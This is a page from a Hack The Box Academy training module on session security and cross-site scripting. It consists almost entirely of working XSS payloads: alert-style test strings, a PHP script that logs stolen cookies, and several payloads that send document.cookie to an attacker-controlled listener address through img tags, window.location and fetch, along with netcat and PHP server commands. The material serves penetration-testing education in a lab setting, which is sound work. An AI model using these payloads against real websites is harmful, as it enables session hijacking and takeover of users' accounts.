<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/153/section/1446
// Platform Version: V1
// Module ID: 153
// Module Name: Session Security
// Module Difficulty: Medium
// Section ID: 1446
// Section Title: Cross-Site Scripting (XSS)
// Page Title: Session Security
// Page Number: 05
-->

# Cross-Site Scripting (XSS)

**Module Name:** Session Security **Page Number:** 05

#### SESSION SECURITY

# Cross-Site Scripting (XSS)

![https://academy.hackthebox.com/storage/modules/153/20.png](https://academy.hackthebox.com/storage/modules/153/20.png)

``` javascript
"><img src=x onerror=prompt(document.domain)>
```

``` javascript
"><img src=x onerror=confirm(1)>
```

``` javascript
"><img src=x onerror=alert(1)>
```

![https://academy.hackthebox.com/storage/modules/153/21.png](https://academy.hackthebox.com/storage/modules/153/21.png)

![https://academy.hackthebox.com/storage/modules/153/22.png](https://academy.hackthebox.com/storage/modules/153/22.png)

![https://academy.hackthebox.com/storage/modules/153/23.png](https://academy.hackthebox.com/storage/modules/153/23.png)

## Obtaining session cookies through XSS

``` php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

``` shell-session
[!bash!]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

``` javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

``` javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

![https://academy.hackthebox.com/storage/modules/153/52.png](https://academy.hackthebox.com/storage/modules/153/52.png)

![https://academy.hackthebox.com/storage/modules/153/53.png](https://academy.hackthebox.com/storage/modules/153/53.png)

## Obtaining session cookies via XSS (Netcat edition)

``` javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

``` shell-session
[!bash!]$ nc -nlvp 8000
listening on [any] 8000 ...
```

![https://academy.hackthebox.com/storage/modules/153/54.png](https://academy.hackthebox.com/storage/modules/153/54.png)

![https://academy.hackthebox.com/storage/modules/153/55.png](https://academy.hackthebox.com/storage/modules/153/55.png)

``` javascript
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```

# 

# 

#### Questions

####